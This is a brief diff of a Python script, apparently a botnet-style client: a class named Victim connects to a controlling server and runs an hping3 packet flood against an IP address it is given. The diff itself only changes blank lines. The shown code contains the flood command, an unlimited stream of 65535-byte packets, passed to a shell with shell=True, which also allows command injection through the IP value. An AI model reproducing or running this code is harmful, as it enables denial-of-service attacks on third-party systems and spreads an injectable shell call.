@@ -57,10 +57,7 @@ class Victim:
         self.password = password
 
     def connect_to_server(self):
-
-
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
         print("Msg: Client Initiated...")
         self.client.connect((self.server_ip, self.server_port))
         print("Msg: Connection initiated...")
@@ -156,7 +153,7 @@ class Victim:
         hping_command = f"hping3 {ip_address} -d 65535 -c 0"
         process = subprocess.Popen(hping_command, shell=True)
 
-    
+
 if __name__ == '__main__':
     choice = "online"  # "offline"
     server_ip = '127.0.0.1'
